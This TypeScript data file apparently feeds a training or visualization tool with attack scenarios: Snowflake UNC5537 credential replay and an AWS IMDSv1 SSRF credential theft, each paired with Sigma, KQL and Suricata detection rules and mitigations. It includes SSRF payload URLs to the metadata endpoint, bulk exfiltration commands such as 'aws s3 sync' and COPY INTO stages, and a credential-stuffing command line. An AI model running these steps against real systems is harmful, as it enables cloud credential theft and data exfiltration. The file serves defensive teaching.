import { AttackScenario } from './types';

/**
 * ============================================================================
 * AUTHORITATIVE APT & CLOUD SCENARIOS — BATCH 5 (CLOUD, SAAS & CONTAINERS)
 * ============================================================================
 * Multi-Source Verified Scenarios (9 Scenarios):
 * 1. UNC5537 Snowflake SaaS Credential Replay & FROSTBITE / Rapeflake (T1078.004)
 * 2. AWS EC2 SSRF to IMDSv1 (169.254.169.254) IAM Role Theft & S3 Exfil (T1552.005)
 * 3. Snyk "Leaky Vessels" runc WORKDIR /proc/self/fd/7 Container Escape (CVE-2024-21626)
 * 4. Microsoft Storm-0558 MSA Signing Key Acquisition & OWA Token Forgery (T1606.002)
 * 5. Microsoft Entra Connect (Azure AD Connect) MSOL DKM Decryption & Seamless SSO (T1556.007)
 * 6. Rhino Security Labs AWS IAM PassRole + Lambda Privilege Escalation & StopLogging (T1098.001)
 * 7. Sysdig SCARLETEEL Kubernetes Pod Exploit, Terraform .tfstate Theft & Pacu (T1610)
 * 8. Google Cloud ServiceAccountKeys.create & ActAs Impersonation Pivot (T1098.001)
 * 9. Okta Support Case HAR File Session Token (sid) Hijack & Admin API Minting (T1539)
 */

export const SNOWFLAKE_UNC5537_SAAS_EXTORTION_SCENARIO: AttackScenario = {
  id: 'snowflake-unc5537-saas-extortion',
  code: 'T1078.004',
  name: 'Mandiant & Snowflake — UNC5537 Campaign: Infostealer Credential Replay & FROSTBITE (Rapeflake) Exfiltration',
  shortSubtitle: 'Mandiant · Snowflake · CISA · Infostealer Logs · Missing MFA · Rapeflake / DBeaver Bulk SQL Staging',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Investigated by Mandiant, Snowflake, and CISA (June 2024), UNC5537 systematically compromised over 165 enterprise Snowflake customer tenants without breaching Snowflake’s core infrastructure. The threat actors harvested plaintext corporate Snowflake credentials from historical infostealer malware logs (Lumma, RedLine, Vidar, Raccoon) on contractor laptops, logged straight into single-factor customer accounts lacking MFA or network allowlists, ran the custom FROSTBITE ("Rapeflake") and DBeaver Ultimate tools to enumerate databases, and staged massive SQL tables to external storage for extortion.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Mandiant UNC5537 Threat Report · Snowflake Joint Security Advisory · CISA Alert (June 2024)',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1078.004 (Cloud Accounts) · T1087.004 (Cloud Account Discovery) · T1530 (Cloud Storage Data)',
    },
    {
      term: 'ATTACK TOOLING',
      value: 'FROSTBITE (Rapeflake .NET Utility) · DBeaver Ultimate (Java JDBC) · Mullvad VPN Relays',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'SNOWFLAKE.ACCOUNT_USAGE.LOGIN_HISTORY & QUERY_HISTORY (DBeaver_DBeaverUltimate / Rapeflake)',
    },
  ],
  nodes: [
    {
      id: 'unc5537_mullvad_actor',
      label: 'UNC5537 Extortion Operator',
      sublabel: '198.51.100.44 (Mullvad VPN Exit Node)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Workstation (Infostealer Log Parser)',
        pidOrPort: 'HTTPS :443 (Snowflake JDBC / SnowSQL Client)',
        privilege: 'Stolen Contractor Snowflake Credentials (Single-Factor)',
        artifacts: [
          'RedLine / LummaC2 stealer logs (passwords.txt matching *.snowflakecomputing.com)',
          'FROSTBITE (Rapeflake.exe) & DBeaver Ultimate 23.x',
        ],
        description:
          'Financially motivated UNC5537 operator replaying stealer-sourced credentials from anonymizing VPN infrastructure.',
      },
    },
    {
      id: 'snowflake_authn_gateway',
      label: 'Snowflake Cloud Auth Gateway',
      sublabel: 'corp-prod.us-east-1.snowflakecomputing.com',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Snowflake SaaS Authentication & Session Plane',
        pidOrPort: 'TLS :443 (/session/v1/login-request)',
        privilege: 'ACCOUNTADMIN / SYSADMIN Role (No MFA Enforced)',
        artifacts: [
          'FIRST_AUTHENTICATION_FACTOR=PASSWORD, SECOND_AUTHENTICATION_FACTOR=NULL',
          'CLIENT_APPLICATION_ID: DBeaver_DBeaverUltimate 23.3.0',
        ],
        description:
          'Customer Snowflake tenant authentication endpoint permitting password-only logins from untrusted external IPs.',
      },
    },
    {
      id: 'frostbite_rapeflake_engine',
      label: 'FROSTBITE (Rapeflake) Recon Engine',
      sublabel: 'Snowflake SQL Session #99481204',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Automated .NET Snowflake Reconnaissance & Staging Tool',
        pidOrPort: 'PID 6120 (Rapeflake.exe / JDBC Driver 3.14.4)',
        privilege: 'Inherited ACCOUNTADMIN Session Token',
        artifacts: [
          'SHOW DATABASES; SHOW SCHEMAS; SHOW TABLES; SELECT CURRENT_ROLE()',
          'SHOW USERS; SELECT * FROM INFORMATION_SCHEMA.TABLES',
        ],
        description:
          'Executes rapid automated metadata discovery queries across all customer schemas to identify high-value PII and financial tables.',
      },
    },
    {
      id: 'snowflake_warehouse_exfil',
      label: 'Snowflake Virtual Warehouse & Stage',
      sublabel: 'COMPUTE_WH (COPY INTO @TEMP_STAGE)',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Snowflake Cloud Data Warehouse Storage Engine',
        pidOrPort: 'SQL COPY INTO / GET @~ Staged CSV/Parquet',
        privilege: 'Full Read/Export on PROD_CUSTOMER_DB',
        artifacts: [
          'CREATE TEMP STAGE exfil_stage; COPY INTO @exfil_stage FROM CUSTOMERS_PII',
          'GET @exfil_stage file:///tmp/dump/ (Multi-GB CSV export)',
        ],
        description:
          'Compromised virtual warehouse executing bulk table exports into temporary internal stages for rapid download.',
      },
    },
    {
      id: 'snowflake_account_usage_siem',
      label: 'Snowflake ACCOUNT_USAGE & SIEM',
      sublabel: 'LOGIN_HISTORY + QUERY_HISTORY Monitor',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Cloud SIEM & Snowflake Security Data Lake',
        pidOrPort: 'SNOWFLAKE.ACCOUNT_USAGE Audit Views',
        privilege: 'SOC Detection & Network Policy Enforcement',
        artifacts: [
          'Mandiant Hunting Query: CLIENT_ENVIRONMENT.APPLICATION IN (DBeaver, Rapeflake)',
          'ALTER ACCOUNT SET NETWORK_POLICY = corp_egress_only, MFA Enforcement',
        ],
        description:
          'Correlates single-factor logins from Mullvad VPN ranges with DBeaver/Rapeflake User-Agents and bulk COPY INTO queries.',
      },
    },
  ],
  processTree: [
    {
      pid: 6120,
      ppid: 1840,
      name: 'Rapeflake.exe (FROSTBITE)',
      commandLine: 'Rapeflake.exe --targets stealer_snowflake_list.txt --threads 16 --check-roles',
      user: 'UNC5537-OP\\operator',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 1,
      apiCalls: ['HttpClient.PostAsync("/session/v1/login-request")', 'SnowflakeDbConnection.Open()'],
      memoryBlocks: [
        {
          address: '0x00007FF910440000',
          section: '.text (FROSTBITE JDBC Reconnaissance Module)',
          permissions: 'R-X',
          size: '128 KB',
          status: 'injected',
          description: 'Custom .NET assembly automating credential stuffing and SHOW TABLES / SHOW USERS queries against Snowflake tenants.',
          hexPreview: '4D 5A 90 00 03 00 00 00 53 48 4F 57 20 55 53 45 (SHOW USERS / Rapeflake)',
        },
      ],
    },
    {
      pid: 7412,
      ppid: 1840,
      name: 'dbeaver.exe (DBeaver Ultimate)',
      commandLine: 'dbeaver.exe -con "driver=snowflake|url=https://corp-prod.us-east-1.snowflakecomputing.com"',
      user: 'UNC5537-OP\\operator',
      integrity: 'High',
      status: 'suspicious',
      activeFromStage: 3,
      apiCalls: ['JDBC.executeQuery("COPY INTO @~")', 'JDBC.executeQuery("GET @~")'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'INFOSTEALER CREDENTIAL REPLAY ON SINGLE-FACTOR TENANT',
      subtitle: 'Authenticating to *.snowflakecomputing.com without MFA using Lumma/RedLine stealer logs',
      description:
        'UNC5537 parses millions of historical infostealer logs (Lumma, RedLine, Vidar) for saved credentials matching *.snowflakecomputing.com and replays them from Mullvad VPN nodes against customer tenants where SECOND_AUTHENTICATION_FACTOR is NULL and no Network Policy restricts source IPs.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1078.004',
      mitreTechniqueName: 'Valid Accounts: Cloud Accounts',
      activeNodeIds: ['unc5537_mullvad_actor', 'snowflake_authn_gateway', 'snowflake_account_usage_siem'],
      compromisedNodeIds: ['snowflake_authn_gateway'],
      keySpecs: [
        { term: 'INITIAL VECTOR', value: 'Plaintext Credentials from RedLine / Vidar / Lumma Stealer Logs' },
        { term: 'AUTH GAP', value: 'SECOND_AUTHENTICATION_FACTOR = NULL & Missing Network Policy' },
        { term: 'CLIENT FINGERPRINT', value: 'FROSTBITE (Rapeflake) / .NET Snowflake Driver' },
      ],
    },
    {
      index: 2,
      title: 'FROSTBITE (RAPEFLAKE) AUTOMATED SCHEMA RECONNAISSANCE',
      subtitle: 'Enumerating ACCOUNTADMIN privileges, users, and high-row-count customer tables',
      description:
        'Upon establishing a valid session token, the FROSTBITE (Rapeflake) utility automatically issues burst SQL queries—SELECT CURRENT_ROLE(), SHOW USERS, SHOW DATABASES, and SELECT * FROM INFORMATION_SCHEMA.TABLES—to triage tenants with hundreds of millions of customer records.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1087.004',
      mitreTechniqueName: 'Account Discovery: Cloud Account',
      activeNodeIds: ['snowflake_authn_gateway', 'frostbite_rapeflake_engine', 'snowflake_account_usage_siem'],
      compromisedNodeIds: ['snowflake_authn_gateway', 'frostbite_rapeflake_engine'],
      keySpecs: [
        { term: 'RECON UTILITY', value: 'FROSTBITE (Rapeflake) Automated SQL Enumerator' },
        { term: 'SQL QUERIES', value: 'SHOW USERS; SHOW ROLES;SHOW DATABASES; INFORMATION_SCHEMA.TABLES' },
        { term: 'AUDIT VIEW', value: 'SNOWFLAKE.ACCOUNT_USAGE.QUERY_HISTORY' },
      ],
    },
    {
      index: 3,
      title: 'DBEAVER ULTIMATE BULK STAGE & MULTI-GB EXFILTRATION',
      subtitle: 'Executing COPY INTO temporary stages and downloading compressed CSV/Parquet archives',
      description:
        'Using DBeaver Ultimate over the Snowflake JDBC driver, the operator runs SELECT * or COPY INTO @~ (user stage) to compress multi-gigabyte customer PII tables into staged chunks and downloads them over HTTPS for extortion.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1530',
      mitreTechniqueName: 'Data from Cloud Storage',
      activeNodeIds: ['frostbite_rapeflake_engine', 'snowflake_warehouse_exfil', 'snowflake_account_usage_siem'],
      compromisedNodeIds: ['snowflake_authn_gateway', 'frostbite_rapeflake_engine', 'snowflake_warehouse_exfil'],
      keySpecs: [
        { term: 'EXFIL CLIENT', value: 'DBeaver_DBeaverUltimate (JDBC Driver)' },
        { term: 'STAGING COMMAND', value: 'COPY INTO @~/exfil_dump/ FROM PROD_DB.PUBLIC.CUSTOMERS' },
        { term: 'SIEM REMEDIATION', value: 'Enforce DUO/FIDO2 MFA + Snowflake Network Policy Allowlist' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'sf-unc5537-1',
      no: 1,
      stageIndex: 1,
      timestamp: '02:14:11.204',
      sourceNodeId: 'unc5537_mullvad_actor',
      targetNodeId: 'snowflake_authn_gateway',
      sourceLabel: 'UNC5537 VPN Node',
      targetLabel: 'Snowflake Auth Gateway',
      sourceType: 'NETWORK',
      protocolOrEventId: 'SNOWFLAKE LOGIN_HISTORY',
      shortAction: 'SINGLE_FACTOR_LOGIN_SUCCESS',
      info: 'USER_NAME=SVC_TABLEAU_ETL FIRST_AUTH=PASSWORD SECOND_AUTH=NULL CLIENT_IP=198.51.100.44',
      sizeOrCode: 'EVENT_ID 8841920',
      severity: 'HIGH',
      mitreId: 'T1078.004',
      explanation: 'Single-factor password login to Snowflake from an anonymizing VPN IP using stealer-harvested service credentials.',
      rawLog: `{"EVENT_TYPE":"LOGIN","USER_NAME":"SVC_TABLEAU_ETL","CLIENT_IP":"198.51.100.44","REPORTED_CLIENT_TYPE":"OTHER","FIRST_AUTHENTICATION_FACTOR":"PASSWORD","SECOND_AUTHENTICATION_FACTOR":null,"IS_SUCCESS":"YES"}`,
      detectionRule: {
        type: 'KQL',
        title: 'Snowflake Single-Factor Login from Untrusted ASN / DBeaver Client',
        ruleCode: `SELECT * FROM SNOWFLAKE.ACCOUNT_USAGE.LOGIN_HISTORY WHERE IS_SUCCESS = 'YES' AND SECOND_AUTHENTICATION_FACTOR IS NULL;`,
        mitigation: 'Enforce MFA (EXT_AUTHN_DUO / SAML2) and attach a strict Snowflake NETWORK_POLICY to all human and service accounts.',
      },
    },
    {
      id: 'sf-unc5537-2',
      no: 2,
      stageIndex: 2,
      timestamp: '02:14:13.890',
      sourceNodeId: 'snowflake_authn_gateway',
      targetNodeId: 'frostbite_rapeflake_engine',
      sourceLabel: 'Snowflake Auth Gateway',
      targetLabel: 'FROSTBITE (Rapeflake)',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'SNOWFLAKE QUERY_HISTORY',
      shortAction: 'RAPEFLAKE_SCHEMA_RECON',
      info: 'APPLICATION=Rapeflake QUERY="SHOW DATABASES; SHOW USERS; SELECT * FROM INFORMATION_SCHEMA.TABLES"',
      sizeOrCode: 'ROWS_PRODUCED 412',
      severity: 'CRITICAL',
      mitreId: 'T1087.004',
      explanation: 'FROSTBITE (Rapeflake) automated reconnaissance enumerating databases, roles, and table row counts.',
      rawLog: `{"QUERY_ID":"01b4c912-0001-8492","USER_NAME":"SVC_TABLEAU_ETL","ROLE_NAME":"ACCOUNTADMIN","CLIENT_APPLICATION_ID":"Rapeflake 1.0","QUERY_TEXT":"SELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, ROW_COUNT, BYTES FROM INFORMATION_SCHEMA.TABLES WHERE ROW_COUNT > 100000"}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Mandiant UNC5537 FROSTBITE / Rapeflake Client Application Signature',
        ruleCode: `title: UNC5537 Snowflake Rapeflake or DBeaver Reconnaissance
logsource:
  product: snowflake
detection:
  selection:
    CLIENT_ENVIRONMENT.APPLICATION|contains:
      - 'Rapeflake'
      - 'DBeaver_DBeaverUltimate'
  condition: selection`,
        mitigation: 'Rotate compromised credentials immediately, terminate active sessions via SYSTEM$ABORT_SESSION, and block non-approved JDBC client identifiers.',
      },
    },
    {
      id: 'sf-unc5537-3',
      no: 3,
      stageIndex: 3,
      timestamp: '02:19:45.512',
      sourceNodeId: 'frostbite_rapeflake_engine',
      targetNodeId: 'snowflake_warehouse_exfil',
      sourceLabel: 'FROSTBITE / DBeaver',
      targetLabel: 'Snowflake Warehouse Stage',
      sourceType: 'NETWORK',
      protocolOrEventId: 'SNOWFLAKE COPY_INTO',
      shortAction: 'BULK_STAGE_EXFILTRATION',
      info: 'CLIENT=DBeaver_DBeaverUltimate QUERY="COPY INTO @~/dump/customers.csv.gz FROM PROD_DB.PUBLIC.CUSTOMERS"',
      sizeOrCode: 'BYTES_WRITTEN 4.8 GB',
      severity: 'CRITICAL',
      mitreId: 'T1530',
      explanation: 'Bulk data staging and GET download of 4.8 GB of customer PII via DBeaver Ultimate.',
      rawLog: `{"QUERY_TYPE":"COPY","USER_NAME":"SVC_TABLEAU_ETL","WAREHOUSE_NAME":"COMPUTE_WH","CLIENT_APPLICATION_ID":"DBeaver_DBeaverUltimate 23.3.0","QUERY_TEXT":"COPY INTO @~/dump/customers.csv.gz FROM PROD_DB.PUBLIC.CUSTOMERS FILE_FORMAT=(TYPE=CSV COMPRESSION=GZIP)"}`,
      detectionRule: {
        type: 'KQL',
        title: 'Anomalous Snowflake Bulk COPY INTO Internal Stage Followed by GET',
        ruleCode: `SELECT USER_NAME, QUERY_TEXT, BYTES_WRITTEN_TO_RESULT FROM SNOWFLAKE.ACCOUNT_USAGE.QUERY_HISTORY WHERE QUERY_TYPE IN ('COPY', 'GET') AND BYTES_WRITTEN_TO_RESULT > 500000000;`,
        mitigation: 'Restrict CREATE STAGE / COPY INTO privileges and migrate service accounts to Key-Pair Authentication or OAuth Workload Identity.',
      },
    },
  ],
};

export const AWS_IMDSV1_SSRF_CAPITALONE_STYLE_SCENARIO: AttackScenario = {
  id: 'aws-imdsv1-ssrf-capitalone-style',
  code: 'T1552.005',
  name: 'AWS Security, Unit 42 & MITRE — EC2 Reverse-Proxy SSRF to IMDSv1 (169.254.169.254) IAM Role & S3 Exfiltration',
  shortSubtitle: 'AWS Security · Unit 42 · MITRE T1552.005 · 169.254.169.254 IMDSv1 · STS Temporary Credentials & aws s3 sync',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
    'Documented by AWS Security, Palo Alto Networks Unit 42, and MITRE ATT&CK (T1552.005), Server-Side Request Forgery (SSRF) against cloud workloads with Instance Metadata Service Version 1 (IMDSv1) enabled allows external attackers to query the link-local metadata endpoint (http://169.254.169.254/latest/meta-data/iam/security-credentials/). Because IMDSv1 responds to stateless HTTP GET requests without requiring a session token, the vulnerable EC2 reverse proxy returns the attached IAM Instance Profile’s temporary STS AccessKeyId, SecretAccessKey, and SessionToken—allowing the attacker to replay those credentials from outside AWS via aws s3 sync to exfiltrate private S3 buckets.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'AWS Security Blog (IMDSv2 Defense-in-Depth) · Unit 42 Cloud SSRF Research · MITRE ATT&CK T1552.005',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App SSRF) · T1552.005 (Cloud Instance Metadata API) · T1530 (Cloud Storage)',
    },
    {
      term: 'METADATA ENDPOINT',
      value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'AWS CloudTrail (ListBuckets / GetObject by AssumedRole from External IP) & GuardDuty InstanceCredentialExfiltration',
    },
  ],
  nodes: [
    {
      id: 'external_ssrf_attacker',
      label: 'External Cloud Adversary',
      sublabel: '198.51.100.88 (AWS CLI v2 Exfil Host)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Linux Host (aws-cli/2.15.0)',
        pidOrPort: 'HTTPS :443 (SSRF Probe & AWS S3 API)',
        privilege: 'Unauthenticated Web Client -> Stolen IAM Role',
        artifacts: [
          'GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          'AWS_ACCESS_KEY_ID=ASIA... AWS_SESSION_TOKEN=FwoGZXIvYXdzE...',
        ],
        description:
          'Attacker exploiting an unvalidated URL fetcher on an EC2 web proxy to extract temporary STS IAM credentials.',
      },
    },
    {
      id: 'ec2_waf_reverse_proxy',
      label: 'EC2 Web Proxy (IMDSv1 Enabled)',
      sublabel: '172.31.12.19 (i-0a84b92c11e3f0412)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Amazon Linux 2 EC2 Instance (HttpTokens=optional)',
        pidOrPort: 'PID 2208 (nginx / node-ssrf-proxy :8443)',
        privilege: 'IAM Instance Profile: WafProxyS3ReadRole',
        artifacts: [
          'MetadataOptions: HttpTokens="optional", HttpPutResponseHopLimit=2',
          'SSRF backend request to 169.254.169.254:80',
        ],
        description:
          'Public-facing EC2 workload running a URL preview/proxy endpoint with legacy IMDSv1 enabled.',
      },
    },
    {
      id: 'aws_imds_link_local',
      label: 'EC2 Instance Metadata Service',
      sublabel: '169.254.169.254:80 (IMDSv1 Link-Local)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'AWS Nitro Hypervisor Link-Local Metadata Service',
        pidOrPort: 'HTTP :80 (/latest/meta-data/iam/security-credentials/)',
        privilege: 'Instance Role STS Token Generator',
        artifacts: [
          'AccessKeyId: ASIAIOSFODNN7EXAMPLE',
          'SecretAccessKey & Token (Valid for 6 hours)',
        ],
        description:
          'Returns temporary AWS STS credentials in plaintext JSON to any local HTTP GET request when IMDSv1 is active.',
      },
    },
    {
      id: 'aws_s3_production_buckets',
      label: 'AWS S3 Production Data Buckets',
      sublabel: 's3://corp-credit-applications-prod',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Amazon S3 Object Storage Service (us-east-1)',
        pidOrPort: 'HTTPS :443 (s3.us-east-1.amazonaws.com)',
        privilege: 'Accessible via WafProxyS3ReadRole (s3:List*, s3:Get*)',
        artifacts: [
          'aws s3 ls & aws s3 sync s3://corp-credit-applications-prod ./loot',
          'CloudTrail Data Event: GetObject on 14,200 parquet records',
        ],
        description:
          'Sensitive enterprise S3 bucket accessed from an external IP using the stolen EC2 instance role credentials.',
      },
    },
    {
      id: 'aws_guardduty_cloudtrail_siem',
      label: 'AWS GuardDuty & CloudTrail SIEM',
      sublabel: 'UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'AWS GuardDuty & CloudTrail Lake Detection Plane',
        pidOrPort: 'GuardDuty Finding / CloudTrail Management & Data Logs',
        privilege: 'Cloud SOC & SCP Enforcement',
        artifacts: [
          'UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS',
          'aws ec2 modify-instance-metadata-options --http-tokens required',
        ],
        description:
          'Detects EC2 instance profile credentials (`ASIA...`) being used from an IP address outside the AWS VPC.',
      },
    },
  ],
  processTree: [
    {
      pid: 2208,
      ppid: 1,
      name: 'node (SSRF Web Service)',
      commandLine: '/usr/bin/node /srv/proxy-app/server.js --port 8443',
      user: 'ec2-user',
      integrity: 'Medium',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/WafProxyS3ReadRole")'],
      memoryBlocks: [
        {
          address: '0x00007F2B44100000',
          section: 'V8 Heap (SSRF Response Buffer)',
          permissions: 'RW-',
          size: '64 KB',
          status: 'injected',
          description: 'Buffered JSON response from 169.254.169.254 containing temporary STS AccessKeyId (ASIA...) and SessionToken.',
          hexPreview: '7B 22 43 6F 64 65 22 3A 22 53 75 63 63 65 73 73 ({"Code":"Success","AccessKeyId":"ASIA...)',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'SSRF INJECTION TO LINK-LOCAL IMDSV1 ROLE DISCOVERY',
      subtitle: 'Coercing EC2 reverse proxy into fetching http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      description:
        'The attacker passes http://169.254.169.254/latest/meta-data/iam/security-credentials/ into a vulnerable URL parameter on the EC2 web server. Because IMDSv1 accepts unauthenticated HTTP GET requests without an X-aws-ec2-metadata-token header, the server returns the attached IAM role name (WafProxyS3ReadRole).',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application (SSRF)',
      activeNodeIds: ['external_ssrf_attacker', 'ec2_waf_reverse_proxy', 'aws_imds_link_local'],
      compromisedNodeIds: ['ec2_waf_reverse_proxy'],
      keySpecs: [
        { term: 'VULNERABILITY CLASS', value: 'CWE-918 Server-Side Request Forgery (SSRF) on EC2' },
        { term: 'METADATA URI', value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
        { term: 'IMDS CONFIGURATION', value: 'HttpTokens: optional (IMDSv1 Enabled)' },
      ],
    },
    {
      index: 2,
      title: 'EXTRACTION OF TEMPORARY AWS STS ROLE CREDENTIALS (ASIA...)',
      subtitle: 'Retrieving AccessKeyId, SecretAccessKey, and Token from the IMDSv1 JSON payload',
      description:
        'A second SSRF GET request to /latest/meta-data/iam/security-credentials/WafProxyS3ReadRole dumps the JSON credential bundle issued by AWS Security Token Service (STS), exposing the temporary AccessKeyId (prefixed ASIA), SecretAccessKey, and SessionToken.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1552.005',
      mitreTechniqueName: 'Unsecured Credentials: Cloud Instance Metadata API',
      activeNodeIds: ['external_ssrf_attacker', 'ec2_waf_reverse_proxy', 'aws_imds_link_local', 'aws_guardduty_cloudtrail_siem'],
      compromisedNodeIds: ['ec2_waf_reverse_proxy', 'aws_imds_link_local'],
      keySpecs: [
        { term: 'STS ACCESS KEY PREFIX', value: 'ASIA... (Temporary IAM Role Credentials)' },
        { term: 'CREDENTIAL FIELDS', value: 'AccessKeyId + SecretAccessKey + Token (SessionToken)' },
        { term: 'MITRE TECHNIQUE', value: 'T1552.005 (Cloud Instance Metadata API)' },
      ],
    },
    {
      index: 3,
      title: 'OFF-CLOUD CREDENTIAL REPLAY & S3 BUCKET SYNC EXFILTRATION',
      subtitle: 'Running aws s3 sync from external IP and triggering GuardDuty InstanceCredentialExfiltration',
      description:
        'The attacker exports the stolen ASIA credentials into their local AWS CLI environment and runs aws s3 ls and aws s3 sync s3://corp-credit-applications-prod. AWS CloudTrail records the EC2 AssumedRole being invoked from an external WAN IP (198.51.100.88), immediately firing GuardDuty’s InstanceCredentialExfiltration.OutsideAWS alert.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1530',
      mitreTechniqueName: 'Data from Cloud Storage',
      activeNodeIds: ['external_ssrf_attacker', 'aws_s3_production_buckets', 'aws_guardduty_cloudtrail_siem'],
      compromisedNodeIds: ['ec2_waf_reverse_proxy', 'aws_imds_link_local', 'aws_s3_production_buckets'],
      keySpecs: [
        { term: 'EXFIL COMMAND', value: 'aws s3 sync s3://corp-credit-applications-prod ./loot' },
        { term: 'GUARDDUTY FINDING', value: 'UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS' },
        { term: 'ARCHITECTURAL FIX', value: 'Enforce IMDSv2 (HttpTokens=required, HopLimit=1) + VPC Endpoint Policy' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'aws-imds-1',
      no: 1,
      stageIndex: 1,
      timestamp: '14:02:18.104',
      sourceNodeId: 'external_ssrf_attacker',
      targetNodeId: 'ec2_waf_reverse_proxy',
      sourceLabel: 'External Attacker',
      targetLabel: 'EC2 Web Proxy',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP GET SSRF',
      shortAction: 'IMDSV1_ROLE_ENUM',
      info: 'GET /api/webhook-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      sizeOrCode: 'HTTP 200 (WafProxyS3ReadRole)',
      severity: 'HIGH',
      mitreId: 'T1190',
      explanation: 'SSRF payload forces the EC2 web service to query the link-local IMDSv1 endpoint and return the IAM role name.',
      rawLog: `198.51.100.88 - - [14/Nov/2026:14:02:18 +0000] "GET /api/webhook-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 18 "-" "curl/8.4.0"`,
      detectionRule: {
        type: 'SURICATA',
        title: 'HTTP Request Parameter Containing AWS/Cloud Link-Local Metadata IP 169.254.169.254',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CLOUD SSRF Attempt to AWS IMDS 169.254.169.254"; content:"169.254.169.254"; http_uri; sid:2028910; rev:2;)`,
        mitigation: 'Block 169.254.169.254 in application URL validators and enforce IMDSv2 (HttpTokens=required) via AWS Service Control Policy.',
      },
    },
    {
      id: 'aws-imds-2',
      no: 2,
      stageIndex: 2,
      timestamp: '14:02:19.442',
      sourceNodeId: 'ec2_waf_reverse_proxy',
      targetNodeId: 'aws_imds_link_local',
      sourceLabel: 'EC2 Web Proxy',
      targetLabel: 'IMDSv1 (169.254.169.254)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'IMDSv1 CREDENTIAL_LEAK',
      shortAction: 'STS_TOKEN_DUMPED',
      info: 'GET /latest/meta-data/iam/security-credentials/WafProxyS3ReadRole -> AccessKeyId=ASIAIOSFODNN7EXAMPLE',
      sizeOrCode: '1,340 Bytes JSON',
      severity: 'CRITICAL',
      mitreId: 'T1552.005',
      explanation: 'IMDSv1 returns the temporary STS credentials for WafProxyS3ReadRole without requiring a PUT session token.',
      rawLog: `{"Code":"Success","LastUpdated":"2026-11-14T13:55:00Z","Type":"AWS-HMAC","AccessKeyId":"ASIAIOSFODNN7EXAMPLE","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","Token":"FwoGZXIvYXdzEJr//////////wEaD...","Expiration":"2026-11-14T20:00:00Z"}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'EC2 Instance Metadata Service v1 (IMDSv1) Credential Access Without Token',
        ruleCode: `title: AWS EC2 IMDSv1 Usage Detected on Production Workload
logsource:
  product: aws
  service: cloudwatch_metrics
detection:
  selection:
    MetricName: 'MetadataNoToken'
    Value|gt: 0
  condition: selection`,
        mitigation: 'Monitor AWS CloudWatch MetadataNoToken metric and run: aws ec2 modify-instance-metadata-options --http-tokens required --http-put-response-hop-limit 1.',
      },
    },
    {
      id: 'aws-imds-3',
      no: 3,
      stageIndex: 3,
      timestamp: '14:04:02.918',
      sourceNodeId: 'external_ssrf_attacker',
      targetNodeId: 'aws_s3_production_buckets',
      sourceLabel: 'External Attacker (ASIA Key)',
      targetLabel: 'AWS S3 Prod Bucket',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'CLOUDTRAIL / GUARDDUTY',
      shortAction: 'S3_SYNC_OUTSIDE_AWS',
      info: 'AssumedRole=WafProxyS3ReadRole Event=ListBuckets/GetObject SourceIP=198.51.100.88 UserAgent=aws-cli/2.15.0',
      sizeOrCode: 'GuardDuty Severity 8.5',
      severity: 'CRITICAL',
      mitreId: 'T1530',
      explanation: 'Stolen EC2 instance credentials used from an external IP to bulk-sync S3 objects, triggering GuardDuty InstanceCredentialExfiltration.',
